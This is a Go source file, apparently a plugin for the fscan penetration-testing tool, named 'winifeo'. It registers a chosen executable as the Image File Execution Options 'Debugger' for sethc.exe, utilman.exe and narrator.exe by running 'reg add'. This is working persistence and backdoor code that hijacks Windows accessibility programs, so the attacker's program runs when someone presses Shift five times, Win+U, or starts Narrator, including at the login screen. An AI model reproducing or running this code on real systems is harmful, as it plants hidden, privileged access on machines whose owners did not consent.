//go:build (plugin_winifeo || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinIFEOPlugin struct {
	plugins.BasePlugin
}

func NewWinIFEOPlugin() *WinIFEOPlugin {
	return &WinIFEOPlugin{BasePlugin: plugins.NewBasePlugin("winifeo")}
}

func (p *WinIFEOPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("未指定PE文件，使用 -win-pe 参数")}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("PE文件不存在: %s", pePath)}
	}

	absPath, _ := filepath.Abs(pePath)

	// 劫持目标：不常用但系统存在的程序
	targets := []struct {
		exe  string
		desc string
	}{
		{"sethc.exe", "粘滞键 (Shift×5)"},
		{"utilman.exe", "辅助功能 (Win+U)"},
		{"narrator.exe", "讲述人"},
	}

	var output strings.Builder
	var successCount int

	for _, t := range targets {
		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, t.exe)
		out, err := exec.Command("reg", "add", key, "/v", "Debugger", "/t", "REG_SZ", "/d", absPath, "/f").CombinedOutput()
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: %s\n", t.desc, strings.TrimSpace(string(out))))
			continue
		}
		output.WriteString(fmt.Sprintf("[成功] %s (%s)\n", t.desc, t.exe))
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winifeo_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winifeo", func() Plugin {
		return NewWinIFEOPlugin()
	})
}
